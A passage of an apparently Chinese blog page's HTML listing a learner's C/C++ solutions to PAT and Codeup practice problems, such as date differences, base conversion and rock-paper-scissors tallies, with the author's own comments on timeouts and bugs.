class="number">13</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;,&#123;<span class="number">28</span>,<span class="number">29</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;,&#123;<span class="number">30</span>,<span class="number">30</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;,&#123;<span class="number">30</span>,<span class="number">30</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;,&#123;<span class="number">30</span>,<span class="number">30</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;,&#123;<span class="number">30</span>,<span class="number">30</span>&#125;,&#123;<span class="number">31</span>,<span class="number">31</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> time_1,time_2;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;time_1,&amp;time_2)!=EOF)&#123;</span><br><span class="line">        <span class="keyword">if</span>(time_1&gt;time_2)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp=time_1;</span><br><span class="line">            time_1=time_2;</span><br><span class="line">            time_2=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> y1=time_1/<span class="number">10000</span>,m1=time_1%<span class="number">10000</span>/<span class="number">100</span>,d1=time_1%<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">int</span> y2=time_2/<span class="number">10000</span>,m2=time_2%<span class="number">10000</span>/<span class="number">100</span>,d2=time_2%<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(y1&lt;y2||m1&lt;m2||d1&lt;d2)&#123;</span><br><span class="line">            d1++;</span><br><span class="line">            <span class="keyword">if</span>(d1==day[m1][runNian(y1)+<span class="number">1</span>])&#123;</span><br><span class="line">                m1++;</span><br><span class="line">                d1=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(m1==<span class="number">13</span>)&#123;</span><br><span class="line">                y1++;</span><br><span class="line">                m1=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1022</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> A,B;</span><br><span class="line">    <span class="keyword">int</span> D;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%d&quot;</span>,&amp;A,&amp;B,&amp;D);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> sum=A+B;</span><br><span class="line">    <span class="keyword">int</span> ans[<span class="number">100000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        ans[num++]=sum%D;</span><br><span class="line">        sum/=D;</span><br><span class="line">    &#125;<span class="keyword">while</span>(sum!=<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-6"><a href="#3-6" class="headerlink" title="3.6"></a>3.6</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1009</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">81</span>];</span><br><span class="line">    <span class="keyword">char</span> s2[<span class="number">81</span>][<span class="number">81</span>];</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s2[num])!=EOF)&#123;</span><br><span class="line">        num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,s2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-Codeup"><a href="#3-Codeup" class="headerlink" title="3(Codeup)"></a>3(Codeup)</h2><h3 id="3-1-1"><a href="#3-1-1" class="headerlink" title="3.1"></a>3.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//E</span></span><br><span class="line"><span class="comment">//PAT A1046</span></span><br><span class="line"><span class="comment">//第三组数据超时了</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="keyword">int</span> D[<span class="number">100001</span>];</span><br><span class="line">    <span class="keyword">int</span> M;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;D[i]);</span><br><span class="line">        sum+=D[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;M);</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> d[<span class="number">100001</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> distance=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> temp_a,temp_b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        temp_a=min(a,b);</span><br><span class="line">        temp_b=max(a,b);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=temp_a;i&lt;temp_b;i++)&#123;</span><br><span class="line">            distance+=D[i];</span><br><span class="line">        &#125;</span><br><span class="line">        d[i]=min(distance,sum-distance);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//优化</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="keyword">int</span> D[<span class="number">100001</span>];</span><br><span class="line">    <span class="keyword">int</span> M;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">            D[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">            D[i]=temp+D[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;M);</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> d[<span class="number">100001</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> distance=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> temp_a,temp_b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">        temp_a=min(a,b);</span><br><span class="line">        temp_b=max(a,b);</span><br><span class="line">        distance=D[temp_b]-D[temp_a];</span><br><span class="line">        d[i]=min(distance,sum-distance);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int L,M;  //1&lt;=L&lt;=10000;1&lt;=M&lt;=100</span></span><br><span class="line"><span class="comment">    while(scanf(&quot;%d%d&quot;,&amp;L,&amp;M)!=EOF,L||M)&#123;</span></span><br><span class="line"><span class="comment">        int a=100,b=0;  //左右端点</span></span><br><span class="line"><span class="comment">        int rest=0;</span></span><br><span class="line"><span class="comment">        while(M--)&#123;</span></span><br><span class="line"><span class="comment">            int temp_a,temp_b;</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d%d&quot;,&amp;temp_a,&amp;temp_b);</span></span><br><span class="line"><span class="comment">            a=min(a,temp_a);</span></span><br><span class="line"><span class="comment">            b=max(b,temp_b);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        rest=(L+1)-(b-a+1);</span></span><br><span class="line"><span class="comment">        printf(&quot;%d\n&quot;,rest);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D</span></span><br><span class="line"><span class="comment">int main()&#123;</span></span><br><span class="line"><span class="comment">    int n,i,EvenNum=0,OddNum=0;</span></span><br><span class="line"><span class="comment">    int Array[1000];</span></span><br><span class="line"><span class="comment">    memset(Array,0,sizeof(Array));</span></span><br><span class="line"><span class="comment">    while(scanf(&quot;%d&quot;,&amp;n)!=EOF)&#123;</span></span><br><span class="line"><span class="comment">        for(i=0;i&lt;n;i++)scanf(&quot;%d&quot;,&amp;Array[i]);</span></span><br><span class="line"><span class="comment">        for(i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">            if(Array[i]%2==0)EvenNum++;</span></span><br><span class="line"><span class="comment">            else OddNum++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(EvenNum&gt;OddNum) printf(&quot;NO\n&quot;);</span></span><br><span class="line"><span class="comment">        else printf(&quot;YES\n&quot;);</span></span><br><span class="line"><span class="comment">        EvenNum=0;</span></span><br><span class="line"><span class="comment">        OddNum=0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//I</span></span><br><span class="line"><span class="comment">//PAT B1018</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">int</span> a_win=<span class="number">0</span>,a_lose=<span class="number">0</span>,sum=N;</span><br><span class="line">    <span class="keyword">int</span> C_win=<span class="number">0</span>,J_win=<span class="number">0</span>,B_win=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> C_lose=<span class="number">0</span>,J_lose=<span class="number">0</span>,B_lose=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> a,b;</span><br><span class="line">    <span class="keyword">while</span>(N--)&#123;</span><br><span class="line">        getchar();</span><br><span class="line">        a=getchar();</span><br><span class="line">        getchar();</span><br><span class="line">        b=getchar();</span><br><span class="line">        <span class="comment">//printf(&quot;%c %c\n&quot;,a,b);</span></span><br><span class="line">        <span class="keyword">if</span>(a==<span class="string">&#x27;C&#x27;</span>&amp;&amp;b==<span class="string">&#x27;J&#x27;</span>)&#123;</span><br><span class="line">            a_win++;</span><br><span class="line">            C_win++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="string">&#x27;J&#x27;</span>&amp;&amp;b==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">            a_win++;</span><br><span class="line">            J_win++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="string">&#x27;B&#x27;</span>&amp;&amp;b==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">            a_win++;</span><br><span class="line">            B_win++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="string">&#x27;J&#x27;</span>&amp;&amp;b==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">            a_lose++;</span><br><span class="line">            J_lose++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="string">&#x27;C&#x27;</span>&amp;&amp;b==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">            a_lose++;</span><br><span class="line">            C_lose++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a==<span class="string">&#x27;B&#x27;</span>&amp;&amp;b==<span class="string">&#x27;J&#x27;</span>)&#123;</span><br><span class="line">            a_lose++;</span><br><span class="line">            B_lose++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> a_win2;</span><br><span class="line">    <span class="keyword">char</span> b_win2;</span><br><span class="line">    <span class="keyword">if</span>(B_win&gt;=C_win)&#123;</span><br><span class="line">        a_win2=<span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(J_win&gt;B_win)</span><br><span class="line">            a_win2=<span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(C_win&gt;B_win)&#123;</span><br><span class="line">        a_win2=<span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(J_win&gt;C_win)</span><br><span class="line">            a_win2=<span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(C_lose&gt;=J_lose)&#123;  <span class="comment">//B_win&gt;C_win</span></span><br><span class="line">        b_win2=<span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(B_lose&gt;C_lose)</span><br><span class="line">            b_win2=<span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(J_lose&gt;C_lose)&#123;</span><br><span class="line">        b_win2=<span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(B_lose&gt;J_lose)</span><br><span class="line">            b_win2=<span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>,a_win,sum-a_win-a_lose,a_lose);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>,a_lose,sum-a_win-a_lose,a_win);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c %c\n&quot;</span>,a_win2,b_win2);</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//H</span></span><br><span class="line"><span class="comment">//PAT B1016</span></span><br><span class="line"><span class="comment">//这题有bug，提交上去是对的，但是第一组数据codeblocks里面算出来是398</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char A[11],B[11];</span></span><br><span class="line"><span class="comment">    char Da,Db;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,A);</span></span><br><span class="line"><span class="comment">    getchar();</span></span><br><span class="line"><span class="comment">    scanf(&quot;%c&quot;,&amp;Da);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,B);</span></span><br><span class="line"><span class="comment">    getchar();</span></span><br><span class="line"><span class="comment">    scanf(&quot;%c&quot;,&amp;Db);</span></span><br><span class="line"><span class="comment">    //printf(&quot;%s\n&quot;,A);</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d\n&quot;,Da);</span></span><br><span class="line"><span class="comment">    //printf(&quot;%s\n&quot;,B);</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d\n&quot;,Db);</span></span><br><span class="line"><span class="comment">    int count_a=0,count_b=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;11;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(A[i]==Da)</span></span><br><span class="line"><span class="comment">            count_a++;</span></span><br><span class="line"><span class="comment">        if(B[i]==Db)</span></span><br><span class="line"><span class="comment">            count_b++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int sum_a=0,sum_b=0;</span></span><br><span class="line"><span class="comment">    while(count_a--)&#123;</span></span><br><span class="line"><span class="comment">        sum_a+=(((int)Da-48)*pow(10.0,count_a));</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    while(count_b--)&#123;</span></span><br><span class="line"><span class="comment">        sum_b+=(((int)Db-48)*pow(10.0,count_b));</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d\n&quot;,sum_a);</span></span><br><span class="line"><span class="comment">    //printf(&quot;%d\n&quot;,sum_b);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;,sum_a+sum_b);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//G</span></span><br><span class="line"><span class="comment">//PAT B1012</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N=0; //N&lt;=1000</span></span><br><span class="line"><span class="comment">    int temp[1000];</span></span><br><span class="line"><span class="comment">    int A1=0,A2=0,A3=0,A5=0;</span></span><br><span class="line"><span class="comment">    int flag=0;</span></span><br><span class="line"><span class="comment">    double A4_sum=0.0,A4_count;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;temp[i]);</span></span><br><span class="line"><span class="comment">        if((temp[i]%2==0)&amp;&amp;(temp[i]%5==0))</span></span><br><span class="line"><span class="comment">            A1+=temp[i];</span></span><br><span class="line"><span class="comment">        if(temp[i]%5==2)</span></span><br><span class="line"><span class="comment">            A3++;</span></span><br><span class="line"><span class="comment">        if(temp[i]%5==3)&#123;</span></span><br><span class="line"><span class="comment">            A4_sum+=temp[i];</span></span><br><span class="line"><span class="comment">            A4_count++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(temp[i]%5==4)</span></span><br><span class="line"><span class="comment">            A5=max(A5,temp[i]);</span></span><br><span class="line"><span class="comment">        if(temp[i]%5==1)&#123;</span></span><br><span class="line"><span class="comment">            if(flag%2==0)&#123;</span></span><br><span class="line"><span class="comment">                A2+=temp[i];</span></span><br><span class="line"><span class="comment">                flag++;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else&#123;</span></span><br><span class="line"><span class="comment">                A2-=temp[i];</span></span><br><span class="line"><span class="comment">                flag++;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(A1==0)</span></span><br><span class="line"><span class="comment">        printf(&quot;N &quot;);</span></span><br><span class="line"><span class="comment">    if(A1!=0)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d &quot;,A1);</span></span><br><span class="line"><span class="comment">    if(flag==0)</span></span><br><span class="line"><span class="comment">        printf(&quot;N &quot;);</span></span><br><span class="line"><span class="comment">    if(flag!=0)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d &quot;,A2);</span></span><br><span class="line"><span class="comment">    if(A3==0)</span></span><br><span class="line"><span class="comment">        printf(&quot;N &quot;);</span></span><br><span class="line"><span class="comment">    if(A3!=0)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d &quot;,A3);</span></span><br><span class="line"><span class="comment">    if(A4_sum==0)</span></span><br><span class="line"><span class="comment">        printf(&quot;N &quot;);</span></span><br><span class="line"><span class="comment">    if(A4_sum!=0)</span></span><br><span class="line"><span class="comment">        printf(&quot;%.1f &quot;,A4_sum/A4_count);</span></span><br><span class="line"><span class="comment">    if(A5==0)</span></span><br><span class="line"><span class="comment">        printf(&quot;N&quot;);</span></span><br><span class="line"><span class="comment">    if(A5!=0)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d&quot;,A5);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//F</span></span><br><span class="line"><span class="comment">//PAT B1011</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int T;  //T&lt;=10</span></span><br><span class="line"><span class="comment">    long long A,B,C;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;T);</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=T;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%lld%lld%lld&quot;,&amp;A,&amp;B,&amp;C);</span></span><br><span class="line"><span class="comment">        if((A+B)&gt;C)</span></span><br><span class="line"><span class="comment">            printf(&quot;Case #%d: true\n&quot;,i);</span></span><br><span class="line"><span class="comment">        else</span></span><br><span class="line"><span class="comment">            printf(&quot;Case #%d: false\n&quot;,i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-上机训练"><a href="#3-上机训练" class="headerlink" title="3(上机训练)"></a>3(上机训练)</h2><h3 id="3-1-2"><a href="#3-1-2" class="headerlink" title="3.1"></a>3.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//const int CLK_TCK=100;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1010</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    <span class="keyword">int</span> cont=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n_max=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;m,&amp;n)!=EOF)&#123;</span><br><span class="line">        a[n]=m;</span><br><span class="line">    &#125;</span><br><span class="line">    a[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span 